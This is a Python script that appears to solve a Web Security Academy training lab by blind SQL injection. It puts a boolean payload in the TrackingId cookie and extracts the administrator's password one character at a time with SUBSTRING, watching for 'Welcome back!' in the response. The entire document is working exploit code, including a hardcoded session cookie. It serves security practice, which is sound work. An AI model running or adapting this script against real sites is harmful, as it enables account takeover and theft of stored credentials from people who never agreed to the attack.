import requests

url = 'https://0af4005e039b6a7f80d0762f00190016.web-security-academy.net/'
alphabets = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','1','2','3','4','5','6','7','8','9','0']
flag = "Password: "

for i in range(1,21):
    for a in alphabets:
        try:
            headers = {
            "Cookie": "TrackingId=jonORWPfmHKaLNHR' AND (SELECT SUBSTRING(password," + str(i) + ",1) FROM users WHERE username='administrator')='" + a + ";session=2kifW5cFxvdBY0EbtFDxiYTS033NiDFS",
            }
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                if "Welcome back!" in response.text:
                    flag += a
                    print(flag)
                    break
            else:
                print(f'Error: Status code {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error: {e}')

print(flag)
